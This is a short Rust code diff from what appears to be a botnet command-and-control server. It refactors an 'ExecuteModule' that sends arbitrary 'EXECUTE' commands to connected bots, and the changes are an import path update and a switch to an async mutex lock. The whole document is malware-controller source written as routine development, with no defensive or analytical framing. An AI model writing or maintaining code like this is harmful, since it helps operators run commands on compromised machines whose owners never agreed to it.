@@ -1,9 +1,9 @@
 use async_trait::async_trait;
 use std::sync::Arc;
 use crate::core::state::BotConnection;
-use crate::modules::C2Module;
+use crate::modules::types::C2Module;
 use anyhow::Result;
-
+use tokio::io::AsyncWriteExt;
 pub struct ExecuteModule;
 
 impl ExecuteModule {
@@ -30,7 +30,7 @@ impl C2Module for ExecuteModule {
         let command = args.join(" ");
         let cmd = format!("EXECUTE {}\n", command);
 
-        let mut locked_bot = bot.connection.lock().unwrap();
+        let mut locked_bot = bot.connection.lock().await;
         locked_bot.write_all(cmd.as_bytes()).await?;
 
         Ok(())
